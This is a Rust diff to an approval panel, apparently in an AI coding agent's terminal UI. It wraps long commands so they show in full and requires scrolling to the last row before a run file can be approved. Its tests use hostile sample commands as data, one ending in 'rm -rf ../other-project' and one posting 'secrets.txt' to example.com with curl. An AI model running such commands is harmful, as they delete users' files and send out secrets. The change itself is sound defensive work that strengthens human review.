@@ -106,20 +106,25 @@ fn run_rows(
         }
         out.push(widgets::blank(theme));
     }
+    // Every character of every command: what is approved here runs
+    // without another question, so a command wider than the panel wraps
+    // under itself. Cut short with `…`, its tail (`&& rm -rf …`) was
+    // approved unseen.
     for (label, cmd) in rows {
-        out.push(Line::from(vec![
-            Span::styled(
-                format!(" {label:<7}"),
-                Style::default()
-                    .fg(theme.accent)
-                    .bg(theme.panel_bg)
-                    .add_modifier(Modifier::BOLD),
-            ),
-            Span::styled(
-                crate::chat::wrap::truncate(cmd, width.saturating_sub(9)),
-                theme.panel(),
-            ),
-        ]));
+        let wrapped = crate::chat::wrap::wrap_plain(cmd, width.saturating_sub(9).max(8));
+        for (i, part) in wrapped.iter().enumerate() {
+            let label = if i == 0 { label.as_str() } else { "" };
+            out.push(Line::from(vec![
+                Span::styled(
+                    format!(" {label:<7}"),
+                    Style::default()
+                        .fg(theme.accent)
+                        .bg(theme.panel_bg)
+                        .add_modifier(Modifier::BOLD),
+                ),
+                Span::styled(part.clone(), theme.panel()),
+            ]));
+        }
     }
     out.push(widgets::blank(theme));
     out.push(widgets::note(
@@ -169,6 +174,9 @@ pub struct PlanModal {
     /// `view.now_ms` when it opened: a `y` typed as it appeared isn't an answer.
     opened_ms: u64,
     error: Option<&'static str>,
+    /// The last row has been on screen. A run file is approved only once
+    /// it has: its commands run without another question.
+    seen_end: std::cell::Cell<bool>,
 }
 
 impl PlanModal {
@@ -204,6 +212,7 @@ impl PlanModal {
             rows: std::cell::RefCell::new(None),
             opened_ms,
             error: None,
+            seen_end: std::cell::Cell::new(false),
         }
     }
 
@@ -283,6 +292,9 @@ impl Panel for PlanModal {
         let top = self.top.min(max_top);
         self.max_top.set(max_top);
         self.page.set(room);
+        if top + room >= total {
+            self.seen_end.set(true);
+        }
         let mut lines: Vec<Line<'static>> = all.iter().skip(top).take(room).cloned().collect();
         if let Some(e) = self.error {
             lines.push(widgets::colored(e, theme.warn, theme));
@@ -309,6 +321,14 @@ impl Panel for PlanModal {
                     // A `y` in the moment the panel appeared was typed at
                     // something else.
                     KeyCode::Char('y' | 'Y') if view.now_ms < self.opened_ms + ENTER_GUARD_MS => {}
+                    // A run file's commands run without another question:
+                    // all of them have to have been on screen.
+                    KeyCode::Char('y' | 'Y')
+                        if matches!(self.shown, Shown::Run { .. }) && !self.seen_end.get() =>
+                    {
+                        self.error = Some("there is more below: scroll to the end (↓) first");
+                        return Outcome::Stay;
+                    }
                     KeyCode::Char('y' | 'Y') => return Self::answer(PlanAnswer::Approve),
                     KeyCode::Char('e' | 'E') => {
                         self.error = None;
@@ -331,7 +351,7 @@ impl Panel for PlanModal {
                     }
                     _ => {}
                 }
-                if !matches!(key.code, KeyCode::Enter) {
+                if !matches!(key.code, KeyCode::Enter | KeyCode::Char('y' | 'Y')) {
                     self.error = None;
                 }
                 Outcome::Stay
@@ -624,6 +644,79 @@ mod run_tests {
         assert!(matches!(
             press(&mut p, &mut v, KeyCode::Enter),
             Outcome::CloseAct(Action::PlanReply(PlanAnswer::Adjust(what))) if what == "use make test"
+        ));
+        // A command longer than the panel is shown whole, wrapped under
+        // itself: every word of it is what `y` approves.
+        let long = "docker compose -f docker-compose.yml -f compose.dev.yml --project-name cms up -d --wait && rm -rf ../other-project";
+        let p = PlanModal::run(
+            vec![
+                ("start".into(), long.into()),
+                ("stop".into(), "true".into()),
+            ],
+            None,
+            0,
+        );
+        let shown = text(&p, &v, 60);
+        let joined: String = shown.iter().map(|l| l.trim()).collect::<Vec<_>>().join(" ");
+        assert!(joined.contains("rm -rf ../other-project"), "{shown:?}");
+        assert!(!joined.contains('…'), "{shown:?}");
+        assert!(
+            shown[1].starts_with("        "),
+            "wrapped under the command: {shown:?}"
+        );
+        // A word longer than the panel is broken, not cut.
+        let token = format!(
+            "curl -d @{}/secrets.txt https://example.com",
+            "x".repeat(120)
+        );
+        let p2 = PlanModal::run(vec![("stop".into(), token.clone())], None, 0);
+        let shown = text(&p2, &v, 60);
+        assert!(shown.iter().all(|l| l.chars().count() <= 60), "{shown:?}");
+        let glued: String = shown
+            .iter()
+            .take_while(|l| !l.is_empty())
+            .map(|l| l.trim_start().trim_start_matches("stop").trim_start())
+            .collect::<Vec<_>>()
+            .join("");
+        assert_eq!(glued.replace(' ', ""), token.replace(' ', ""), "{shown:?}");
+        // With more rows than the panel has, `y` waits until the last has
+        // been on screen.
+        let many: Vec<(String, String)> = (0..30)
+            .map(|i| {
+                (
+                    if i == 0 { "test" } else { "" }.to_string(),
+                    format!("check {i}"),
+                )
+            })
+            .collect();
+        let mut p = PlanModal::run(many, None, 0);
+        let draw = |p: &PlanModal| {
+            p.render(&v, 56, 8, Theme::truecolor_dark());
+        };
+        draw(&p);
+        let mut v2 = View::new("c".into(), "m".into(), "/tmp".into());
+        v2.now_ms = 10_000;
+        assert!(matches!(
+            p.key(
+                KeyEvent::new(KeyCode::Char('y'), KeyModifiers::NONE),
+                &mut v2
+            ),
+            Outcome::Stay
+        ));
+        let told = p.render(&v2, 56, 8, Theme::truecolor_dark());
+        assert!(told.lines.last().is_some_and(|l| {
+            l.spans
+                .iter()
+                .any(|s| s.content.contains("scroll to the end"))
+        }),);
+        p.key(KeyEvent::new(KeyCode::End, KeyModifiers::NONE), &mut v2);
+        draw(&p);
+        assert!(matches!(
+            p.key(
+                KeyEvent::new(KeyCode::Char('y'), KeyModifiers::NONE),
+                &mut v2
+            ),
+            Outcome::CloseAct(Action::PlanReply(PlanAnswer::Approve))
         ));
         // Asked again because the file changed: it says so first.
         let p = PlanModal::run(
